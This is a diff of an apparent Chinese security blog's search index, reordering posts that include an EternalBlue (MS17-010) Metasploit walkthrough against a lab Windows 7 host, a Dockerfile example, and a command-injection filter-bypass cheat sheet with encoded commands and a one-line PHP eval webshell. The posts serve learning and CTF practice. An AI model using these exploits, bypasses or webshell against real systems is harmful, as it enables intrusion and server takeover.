@@ -422,6 +422,63 @@ ini_set(‘unserialize_callback_func’,‘mycallback’);<br>
       </categories>
   </entry>
   <entry>
+    <title>MSF利用MS17_010渗透内网主机</title>
+    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
+    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
+<a id="more"></a>
+<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
+<p>攻击主机:kali-linux-2020</p>
+<p>目标主机:win7主机(测试时关闭了防火墙)</p>
+<pre><code>ip:192.168.94.130
+</code></pre>
+<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
+<p>可以看见开放了 445端口的smb共享文件操作</p>
+<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
+<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
+<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
+<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
+<p>启动msf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>可以看到启动成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+<p>看一看利用的模块</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
+<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
+<p><code>options</code>看一下我们需要设置什么payload</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
+<p>可以看到我们需要设置攻击的ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后 <code>run</code>  或者 <code>exploit</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
+<p>可以看到 可能存在ms17_010漏洞</p>
+<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
+<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后run</p>
+<p>可以看到成功了 进行的是meterpreter了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
+<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
+<p>ipconfig可以看到一些信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
+<p><strong>tip:</strong></p>
+<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
+<p>在meterpreter可以使用 background放入后台进程</p>
+<p>sessions 命令可以看后台进程</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
+<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf利用</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Jarvis OJ之web刷题记录</title>
     <url>/2021/03/11/Jarvis-OJ%E4%B9%8Bweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h2 id="PHPINFO"><a class="header-anchor" href="#PHPINFO">¶</a>PHPINFO</h2>
@@ -478,63 +535,6 @@ ini_set(‘unserialize_callback_func’,‘mycallback’);<br>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
 <p>参考:<a href="https://www.cnblogs.com/sijidou/p/10455646.html">https://www.cnblogs.com/sijidou/p/10455646.html</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>MSF利用MS17_010渗透内网主机</title>
-    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
-    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
-<a id="more"></a>
-<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
-<p>攻击主机:kali-linux-2020</p>
-<p>目标主机:win7主机(测试时关闭了防火墙)</p>
-<pre><code>ip:192.168.94.130
-</code></pre>
-<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
-<p>可以看见开放了 445端口的smb共享文件操作</p>
-<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
-<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
-<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
-<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
-<p>启动msf</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>可以看到启动成功</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
-<p>看一看利用的模块</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
-<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
-<p><code>options</code>看一下我们需要设置什么payload</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
-<p>可以看到我们需要设置攻击的ip</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后 <code>run</code>  或者 <code>exploit</code></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
-<p>可以看到 可能存在ms17_010漏洞</p>
-<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
-<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后run</p>
-<p>可以看到成功了 进行的是meterpreter了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
-<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
-<p>ipconfig可以看到一些信息</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
-<p><strong>tip:</strong></p>
-<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
-<p>在meterpreter可以使用 background放入后台进程</p>
-<p>sessions 命令可以看后台进程</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
-<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf利用</category>
-      </categories>
   </entry>
   <entry>
     <title>SoapClient+CRLF组合拳利用</title>
@@ -1178,32 +1178,6 @@ poc</p>
       </categories>
   </entry>
   <entry>
-    <title>dockerfile编写实例</title>
-    <url>/2021/03/18/dockerfile%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B/</url>
-    <content><![CDATA[<p>建立了个docker目录，目录结构如下</p>
-<p><img src="https://img-blog.csdnimg.cn/20210318192417778.png" alt="在这里插入图片描述"></p>
-<p>文件内容如下</p>
-<p>Dockderfile</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line">MAINTAINER L1yee</span><br><span class="line"></span><br><span class="line">ENV REFRESHED_AT 2021-03-18</span><br><span class="line"></span><br><span class="line">ENV LANG C.UTF-8</span><br><span class="line"></span><br><span class="line">RUN sed -i &#39;s&#x2F;http:\&#x2F;\&#x2F;archive.ubuntu.com\&#x2F;ubuntu\&#x2F;&#x2F;http:\&#x2F;\&#x2F;mirrors.163.com\&#x2F;ubuntu\&#x2F;&#x2F;g&#39; &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">RUN apt-get -y install mysql-server</span><br><span class="line"></span><br><span class="line">RUN apt-get -yqq install apache2</span><br><span class="line"></span><br><span class="line">RUN apt-get -yqq install php libapache2-mod-php</span><br><span class="line"></span><br><span class="line">RUN apt-get install -yqq php-mysql php-curl php-gd php-intl php-pear php-imagick php-imap php-mcrypt php-memcache php-pspell php-recode php-snmp php-tidy php-xmlrpc php-xsl</span><br><span class="line"></span><br><span class="line">RUN echo &quot;ServerName localhost:80&quot; &gt;&gt; &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line"></span><br><span class="line">RUN rm -rf &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</span><br><span class="line"></span><br><span class="line">RUN sed -i &#39;s&#x2F;Options Indexes FollowSymLinks&#x2F;Options None&#x2F;&#39; &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line"></span><br><span class="line">ADD .&#x2F;www &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">COPY start.sh &#x2F;root&#x2F;start.sh</span><br><span class="line"></span><br><span class="line">RUN chmod +x &#x2F;root&#x2F;start.sh</span><br><span class="line"></span><br><span class="line">ENTRYPOINT cd &#x2F;root; .&#x2F;start.sh</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br></pre></td></tr></table></figure>
-<p><a href="http://start.sh">start.sh</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">sleep 1</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;apache2ctl -D FOREGROUND</span><br></pre></td></tr></table></figure>
-<p>index.php</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
-<p>然后在当前目录生成镜像</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t docker_file_test .</span><br></pre></td></tr></table></figure>
-<p>创建容器给镜像运行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8817:80 docker_file_test</span><br></pre></td></tr></table></figure>
-<p>访问一下 运行成功</p>
-<p><img src="https://img-blog.csdnimg.cn/20210318192919763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>这样就成功了</p>
-<p>参考:<a href="https://www.kingkk.com/2018/08/docker-%E7%AC%94%E8%AE%B0/">https://www.kingkk.com/2018/08/docker-笔记/</a></p>
-]]></content>
-      <categories>
-        <category>前端</category>
-        <category>docker</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ctfshow入门之文件上传</title>
     <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<h2 id="151-152"><a class="header-anchor" href="#151-152">¶</a>151-152</h2>
@@ -1342,6 +1316,32 @@ Kali Linux 安装 Docker 用网上那个一键安装脚本貌似有点问题，�
 <p>安装awvs</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment">#  将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.200217097</span><br></pre></td></tr></table></figure>
 <p>参:<a href="https://www.sqlsec.com/2020/04/awvs.html">https://www.sqlsec.com/2020/04/awvs.html</a></p>
+]]></content>
+      <categories>
+        <category>前端</category>
+        <category>docker</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>dockerfile编写实例</title>
+    <url>/2021/03/18/dockerfile%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B/</url>
+    <content><![CDATA[<p>建立了个docker目录，目录结构如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210318192417778.png" alt="在这里插入图片描述"></p>
+<p>文件内容如下</p>
+<p>Dockderfile</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line">MAINTAINER L1yee</span><br><span class="line"></span><br><span class="line">ENV REFRESHED_AT 2021-03-18</span><br><span class="line"></span><br><span class="line">ENV LANG C.UTF-8</span><br><span class="line"></span><br><span class="line">RUN sed -i &#39;s&#x2F;http:\&#x2F;\&#x2F;archive.ubuntu.com\&#x2F;ubuntu\&#x2F;&#x2F;http:\&#x2F;\&#x2F;mirrors.163.com\&#x2F;ubuntu\&#x2F;&#x2F;g&#39; &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">RUN apt-get -y install mysql-server</span><br><span class="line"></span><br><span class="line">RUN apt-get -yqq install apache2</span><br><span class="line"></span><br><span class="line">RUN apt-get -yqq install php libapache2-mod-php</span><br><span class="line"></span><br><span class="line">RUN apt-get install -yqq php-mysql php-curl php-gd php-intl php-pear php-imagick php-imap php-mcrypt php-memcache php-pspell php-recode php-snmp php-tidy php-xmlrpc php-xsl</span><br><span class="line"></span><br><span class="line">RUN echo &quot;ServerName localhost:80&quot; &gt;&gt; &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line"></span><br><span class="line">RUN rm -rf &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</span><br><span class="line"></span><br><span class="line">RUN sed -i &#39;s&#x2F;Options Indexes FollowSymLinks&#x2F;Options None&#x2F;&#39; &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line"></span><br><span class="line">ADD .&#x2F;www &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">COPY start.sh &#x2F;root&#x2F;start.sh</span><br><span class="line"></span><br><span class="line">RUN chmod +x &#x2F;root&#x2F;start.sh</span><br><span class="line"></span><br><span class="line">ENTRYPOINT cd &#x2F;root; .&#x2F;start.sh</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br></pre></td></tr></table></figure>
+<p><a href="http://start.sh">start.sh</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">sleep 1</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;apache2ctl -D FOREGROUND</span><br></pre></td></tr></table></figure>
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
+<p>然后在当前目录生成镜像</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t docker_file_test .</span><br></pre></td></tr></table></figure>
+<p>创建容器给镜像运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8817:80 docker_file_test</span><br></pre></td></tr></table></figure>
+<p>访问一下 运行成功</p>
+<p><img src="https://img-blog.csdnimg.cn/20210318192919763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这样就成功了</p>
+<p>参考:<a href="https://www.kingkk.com/2018/08/docker-%E7%AC%94%E8%AE%B0/">https://www.kingkk.com/2018/08/docker-笔记/</a></p>
 ]]></content>
       <categories>
         <category>前端</category>
@@ -1598,90 +1598,6 @@ Kali Linux 安装 Docker 用网上那个一键安装脚本貌似有点问题，�
       </categories>
   </entry>
   <entry>
-    <title>ping命令执行及bypass</title>
-    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
-    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
-<a id="more"></a>
-<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
-<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
-<blockquote>
-<p><code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
-<blockquote>
-<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
-<p>使用下面两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
-<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
-<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
-$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
-加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
-不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
-<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
-<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
-<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
-<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
-<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
-<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
-<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
-<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
-<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
-<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
-<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
-<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
-<blockquote>
-<p>more:一页一页的显示档案内容<br>
-less:与 more 类似<br>
-head:查看头几行<br>
-tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
-tail:查看尾几行<br>
-nl：显示的时候，顺便输出行号<br>
-od:以二进制的方式读取档案内容<br>
-vi:一种编辑器，这个也可以查看<br>
-vim:一种编辑器，这个也可以查看<br>
-sort:可以查看<br>
-uniq:可以查看<br>
-file -f:报错出具体内容</p>
-</blockquote>
-<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
-<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
-<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
-<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
-<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
-<hr>
-<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
-<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
-<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
-<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
     <title>php伪随机数漏洞</title>
